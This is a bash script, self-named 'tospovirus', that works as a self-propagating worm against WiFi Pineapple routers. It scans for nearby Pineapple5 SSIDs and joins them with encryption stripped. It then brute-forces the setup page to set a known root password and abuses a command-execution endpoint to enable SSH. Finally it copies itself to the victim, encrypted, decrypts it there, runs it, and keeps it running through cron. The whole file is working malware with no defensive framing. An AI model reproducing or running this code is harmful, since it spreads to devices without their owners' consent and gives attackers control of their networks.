#!/bin/bash
tv5=/tospo
if [ -e $tv5/pr ] ;
then
rm $tv5/pr;
echo "scheduling job..."
printf "* * * * * $tv5/tv" | crontab -
exit
fi
if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
then
sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
uci commit
wifi
exit
fi
if [ -e $tv5/tlock ] ; then
exit
fi
touch $tv5/tlock
tv4="_csrfToken=a6f6832ff4df61608bf3e38b4facc7550e42244d&commands"
tv0="/components/system/configuration/functions.php?execute="
tv7="tospovirus"
tv6=`uci get wireless.@wifi-iface[0].ssid`
#Do this less often? One in five perhaps?
pushstate() {
echo "Pushing state..."
uci export wireless >$tv5/w
uci export network >$tv5/n
}
popstate () {
echo "Popping state..."
ifconfig br-lan 172.16.42.1 netmask 255.255.255.0 down
ifconfig br-lan 172.16.42.1 netmask 255.255.255.0 up
uci import -f $tv5/n
uci commit network
ifup
uci import -f $tv5/w
uci commit wireless
wifi
}
reconfigure() {
echo "Avoiding conflicts..."
#Generate random ip...
tv2=0
while true
do
tv2=`dd if=/dev/urandom count=1 bs=1 2>/dev/null | hexdump -e '16/1 "%02d"' | cut -f1 | egrep -o "[1-9][0-9]*" | tr '\n' '\0'`
if [ "$tv2" -gt 2 -a "$tv2" -lt 255 ]; then
break
fi 
done
echo "adjust ap to not conflict..."
uci set wireless.@wifi-iface[0].mode='ap'
uci set wireless.@wifi-iface[0].ssid="$tv6"
uci set wireless.radio0.channel='1'
uci set wireless.@wifi-iface[0].hidden='1'
uci commit wireless
echo "Fix up local settings too..."
echo "uci set network.lan.ipaddr='172.16.42.$tv2'"
uci set network.lan.ipaddr="172.16.42.$tv2"
uci set network.lan.netmask='255.255.0.0'
uci set network.lan.gateway='172.16.42.42'
uci set network.lan.dns='8.8.8.8'
uci commit network
echo "Done avoiding conflicts..."
}
connect() {
tv8=$1
echo "Connecting to $tv8..."
reconfigure
echo "find lan device..."
tv13=0
while true
do
tv1=$(uci get wireless.@wifi-iface[$tv13].network 2>&1)
if [ "$tv1" = "wan" ];
then
uci set wireless.@wifi-iface[$tv13].network='lan'
elif [ "$tv1" = "uci: Entry not found" ];
then
break
fi
tv13=$((c+1))
done
echo "Connect to the target..."
uci set wireless.@wifi-iface[2].network=wan
uci set wireless.@wifi-iface[2].mode=sta
uci set wireless.@wifi-iface[2].ssid="$tv8"
uci set wireless.@wifi-iface[2].hidden=0
uci set wireless.@wifi-device[2].channel=11
echo "Stripping keys..."	
uci delete wireless.@wifi-iface[2].key
uci delete wireless.@wifi-iface[2].encryption
echo "uci commit wireless"	
uci commit wireless
wifi
}
post() {
tv9=`printf "$2" | wc -c`
printf "POST $1 HTTP/1.1\nHost:172.16.42.1:1471\nContent-Type:application/x-www-form-urlencoded\nCookie:PHPSESSID=$3\nContent-Length:$tv9\nConnection: close\n\n$2" | nc 172.16.42.1 1471
}
bf() {
tv12=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -o '[0-9a-z]{32}'`
for tv11 in `seq 1 56`
do
post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$tv12" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$tv12" | grep "success" && echo WIN && break;
done
}
login() {
echo "Logging in..."
tv3="username=root&password=pineapplesareyummy&login="
post '/includes/api/login.php' "$tv3" "$tv7" | grep -i 'invalid' && bf && post '/includes/api/login.php' "$tv3" "$tv7" | grep -i 'invalid' && exit
}
handshake() {
echo "Handshaking..."
post "$tv0" "$tv4=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir $tv5;openssl genrsa 512 >$tv5/pr%%26%%26openssl rsa -pubout -in $tv5/pr;" | awk '/-----BEGIN PUBLIC KEY-----/,/-----END PUBLIC KEY-----/' > $tv5/pu
}
infect() {
echo "Encrypting key payload/infecting..."
openssl rsautl -encrypt -inkey $tv5/pu -pubin -in $tv5/k -out $tv5/ek && \
openssl aes-128-cbc -pass file:$tv5/k -in $tv5/tv -out $tv5/etv && \
post "$tv0" "$tv4=printf \"\$(echo $(hexdump -e'16/1 "%02x"' $tv5/ek)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$tv5/ek;printf \"\$(echo $(hexdump -e'16/1 "%02x"' $tv5/etv)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$tv5/etv;printf \"\$(echo $(hexdump -e'16/1 "%02x"' d)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$tv5/d;openssl rsautl -decrypt -inkey $tv5/pr -in $tv5/ek -out $tv5/k; openssl aes-128-cbc -d -pass file:$tv5/k -in $tv5/etv -out $tv5/tv; chmod u%%2Brx $tv5/tv; printf \"$tv5/at\">$tv5/at;at -f $tv5/at now;"
}
echo "Scanning for new devices..."
for tv10 in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$tv6"`
do
pushstate
connect `echo $tv10 | cut -d '"' -f 2`
#Diagnostics----
#uci show wireless
#ping 172.16.42.1 -c 1
#route -n
#ifconfig
#------
echo "Generating random key..."
openssl rand -base64 32 > $tv5/k
#Login or exit on fail
login
#Request a public key from the remote
handshake
#Transfer the virus to the remote
infect
popstate
break
done
rm $tv5/tlock
